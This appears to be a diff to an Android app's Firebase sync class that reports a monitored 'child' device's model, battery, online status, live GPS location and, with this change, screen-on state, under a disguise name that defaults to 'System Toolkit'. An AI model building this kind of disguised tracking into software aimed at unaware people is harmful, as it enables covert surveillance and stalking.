@@ -35,7 +35,8 @@ class FirebaseSyncManager private constructor(private val context: Context) {
         batteryLevel: Int? = null,
         isOnline: Boolean = true,
         disguise: String = "System Toolkit",
-        location: String = "Live GPS Active"
+        location: String = "Live GPS Active",
+        isScreenOn: Boolean? = null
     ) {
         try {
             val dynamicModel = "${android.os.Build.MANUFACTURER.replaceFirstChar { it.uppercase() }} ${android.os.Build.MODEL}"
@@ -43,11 +44,15 @@ class FirebaseSyncManager private constructor(private val context: Context) {
                 val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
                 bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 85
             }
+            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+            val screenInteractive = isScreenOn ?: (pm?.isInteractive ?: true)
+
             val statusData = hashMapOf(
                 "id" to childId,
                 "deviceModel" to dynamicModel,
                 "batteryLevel" to realBattery,
                 "isOnline" to isOnline,
+                "isScreenOn" to screenInteractive,
                 "selectedDisguise" to disguise,
                 "locationAddress" to location,
                 "lastSeen" to FieldValue.serverTimestamp()
